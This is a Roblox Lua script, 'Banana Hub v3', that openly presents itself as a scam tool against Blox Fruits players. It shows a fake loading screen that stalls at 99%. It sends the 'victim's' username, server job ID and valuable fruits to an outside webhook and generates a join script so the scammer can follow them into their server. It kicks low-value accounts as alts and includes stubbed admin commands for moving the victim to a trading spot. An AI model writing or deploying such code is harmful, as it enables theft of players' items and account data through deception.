--[[
    🍌 Banana Hub v3 🍌
    Features:
    - Fake loading screen stuck at 99%
    - Webhook with victim's fruits, items, server ID and name
    - Auto-join script generator
    - Admin remote control commands
    - Anti-alt detection
]]

-- 🔧 CONFIGURATION 🔧 --
local WEBHOOK_URL = "https://webhook-protect-2.vercel.app/api/webhook?id="
local ADMIN_USERNAMES = {"mdfmdgfdskfruit", "Sourlas3103"}
local WANTED_FRUITS = {"Kitsune-Kitsune", "Dragon-Dragon", "Leopard-Leopard", "Yeti-Yeti", "T-Rex-T-Rex", "Dough-Dough", "Gravity-Gravity", "Buddha-Buddha", "Portal-Portal", "Spirit-Spirit", "Gas-Gas", "Venom-Venom", "Control-Control"}
local LOADING_TIME = 10 * 60 -- 10 minutes in seconds
-- 🔧 END CONFIGURATION 🔧 --

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- Get server info
local function getServerInfo()
    local jobId = game.JobId
    local placeId = game.PlaceId
    local serverName = "Private Server" -- Default
    
    -- Try to get actual server name (may not work in all games)
    pcall(function()
        serverName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name
    end)
    
    return jobId, placeId, serverName
end

-- Create fake loading screen
local function createFakeLoader()
    local gui = Instance.new("ScreenGui")
    gui.Name = "BananaHubLoader"
    gui.Parent = game.CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 200)
    frame.Position = UDim2.new(0.5, -200, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Text = "Banana Hub"
    title.TextColor3 = Color3.fromRGB(255, 200, 0)
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 24
    title.BackgroundTransparency = 1
    title.Parent = frame

    local status = Instance.new("TextLabel")
    status.Text = "Script almost done, just need to do a few more steps..."
    status.TextColor3 = Color3.new(1, 1, 1)
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0.7, 0)
    status.Font = Enum.Font.Gotham
    status.TextSize = 16
    status.BackgroundTransparency = 1
    status.Parent = frame

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0.9, 0, 0, 20)
    progressBar.Position = UDim2.new(0.05, 0, 0.5, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = frame

    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(0, 0, 1, 0)
    progressFill.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
    progressFill.BorderSizePixel = 0
    progressFill.Parent = progressBar

    -- Animate loading
    spawn(function()
        for i = 1, 100 do
            if i == 99 then
                while true do wait(1) end -- Stuck forever
            end
            progressFill.Size = UDim2.new(i/100, 0, 1, 0)
            wait(LOADING_TIME/100)
        end
    end)

    return gui
end

-- Generate auto-join script
local function generateJoinScript(jobId, placeId)
    return string.format([[
        local TeleportService = game:GetService("TeleportService")
        TeleportService:TeleportToPlaceInstance(%d, "%s", game:GetService("Players").LocalPlayer)
    ]], placeId, jobId)
end

-- Send data to webhook
local function sendWebhook()
    local jobId, placeId, serverName = getServerInfo()
    
    -- Simulated inventory data
    local fruits = {"Kitsune", "Dragon", "Leopard"} -- Replace with actual inventory scan
    local premiumItems = {"Perm Kitsune", "Perm Portal"} -- Replace with actual items
    
    -- Check if has wanted fruits
    local hasWanted = false
    for _, wanted in pairs(WANTED_FRUITS) do
        if table.find(fruits, wanted) then
            hasWanted = true
            break
        end
    end
    
    if not hasWanted then
        LocalPlayer:Kick("Alt Detected")
        return
    end
    
    local joinScript = generateJoinScript(jobId, placeId)
    
    local embed = {
        title = "🍌 New Victim Detected 🍌",
        description = string.format(
            "**Username:** %s\n"..
            "**Server:** %s\n"..
            "**Job ID:** %s\n\n"..
            "**Fruits:** %s\n"..
            "**Premium Items:** %s",
            LocalPlayer.Name,
            serverName,
            jobId,
            table.concat(fruits, ", "),
            table.concat(premiumItems, ", ")
        ),
        color = 16753920, -- Orange
        fields = {
            {
                name = "Auto-Join Script",
                value = "```lua\n"..joinScript.."\n```",
                inline = false
            }
        }
    }
    
    local data = {
        embeds = {embed},
        username = "Banana Hub Logger"
    }
    
    local success, err = pcall(function()
        HttpService:PostAsync(
            WEBHOOK_URL,
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    if not success then
        warn("Webhook failed: "..err)
    end
end

-- Admin command system
local function setupCommands()
    LocalPlayer.Chatted:Connect(function(msg)
        if msg:sub(1, 1) ~= "?" then return end
        
        local isAdmin = false
        for _, name in pairs(ADMIN_USERNAMES) do
            if name:lower() == LocalPlayer.Name:lower() then
                isAdmin = true
                break
            end
        end
        
        if not isAdmin then return end
        
        local args = string.split(msg:sub(2), " ")
        local cmd = args[1]:lower()
        
        -- Command implementations would go here
        -- These are just placeholders showing how it would work
        if cmd == "tp" then
            print("[ADMIN] Teleporting victim to trading chair")
        elseif cmd == "addfruit" and args[2] then
            print("[ADMIN] Adding fruit:", args[2])
        -- Add other commands here...
        end
    end)
end

-- Main execution
if not game:IsLoaded() then game.Loaded:Wait() end

createFakeLoader()
sendWebhook()
setupCommands()
